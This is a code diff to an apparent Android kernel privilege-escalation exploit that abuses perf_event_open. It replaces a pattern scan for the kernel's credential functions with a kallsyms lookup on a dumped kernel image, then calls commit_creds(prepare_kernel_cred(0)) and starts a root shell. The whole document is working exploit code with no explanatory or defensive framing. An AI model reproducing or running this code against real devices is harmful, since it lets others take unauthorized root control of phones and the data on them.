@@ -27,6 +27,7 @@
 #include <sys/syscall.h>
 
 #include "perf_event_exploit/perf_event.h"
+#include "kallsyms/kallsyms_in_memory.h"
 
 #ifndef __NR_perf_event_open
 #define __NR_perf_event_open   (__NR_SYSCALL_BASE+364)
@@ -76,44 +77,6 @@ int (*commit_creds)(struct cred *) = NULL;
 int
 obtain_root_privilege(void)
 {
-  unsigned int *address = (int*)KERNEL_ADDRESS;
-  int i;
-
-  for (i = 0; i < 0x200000; i++) {
-    if (((address[i] & 0xffffff00) == 0xe92d4000 || (address[i] & 0xffff0000) == 0xe59f0000) &&
-        address[i + 1] == 0xe3a010d0 &&
-        ((address[i + 2] & 0xffffff00) == 0xe92d4000 || (address[i + 2] & 0xffff0000) == 0xe59f0000) &&
-        ((address[i + 3] & 0xffff00ff) == 0xe1a00000) &&
-        ((address[i + 4] & 0xfff0ffff) == 0xe5900000)) {
-      prepare_kernel_cred = (void*)(address + i);
-      break;
-    }
-  }
-
-  if (!prepare_kernel_cred) {
-    return 0;
-  }
-
-  for (i = 0; i < 0x200000; i++) {
-    if ((address[i] & 0xffffff00) == 0xe92d4000 &&
-        address[i + 1] == 0xe1a0200d &&
-        address[i + 2] == 0xe3c23d7f &&
-        address[i + 3] == 0xe1a05000 &&
-        address[i + 4] == 0xe3c3303f &&
-        (address[i + 5] & 0xfff00000) == 0xe5900000 &&
-        (address[i + 6] & 0xfff00000) == 0xe5900000 &&
-        (address[i + 7] & 0xfff00000) == 0xe5900000 &&
-        (address[i + 8] & 0xfff00000) == 0xe5900000 &&
-        (address[i + 9] & 0xfff0ff00) == 0xe1500000) {
-      commit_creds = (void*)(address + i);
-      break;
-    }
-  }
-
-  if (!commit_creds) {
-    return 0;
-  }
-
   return commit_creds(prepare_kernel_cred(0));
 }
 
@@ -396,11 +359,36 @@ run_exploit(int offset)
   return perf_event_run_exploit_with_offset(offset, (int)&obtain_root_privilege, call_ptmx_fsync, NULL);
 }
 
+static bool
+setup_cred_functions(int offset)
+{
+  void *kernel;
+
+  kernel = malloc(KERNEL_SIZE);
+  if (!kernel) {
+    return -ENOMEM;
+  }
+
+  dump_kernel_to_memory(offset, kernel);
+  if (kallsyms_in_memory_init(kernel, KERNEL_SIZE)) {
+    commit_creds = (void*)kallsyms_in_memory_lookup_name("commit_creds");
+    prepare_kernel_cred = (void*)kallsyms_in_memory_lookup_name("prepare_kernel_cred");
+  }
+  free(kernel);
+
+  return (commit_creds && prepare_kernel_cred);
+}
+
 static int
 run_root_shell(int offset)
 {
+  if (!setup_cred_functions(offset)) {
+    return -EFAULT;
+  }
+
   printf("run root shell\n");
   run_exploit(offset);
+
   return execl("/system/bin/sh", "/system/bin/sh", NULL);
 }
 
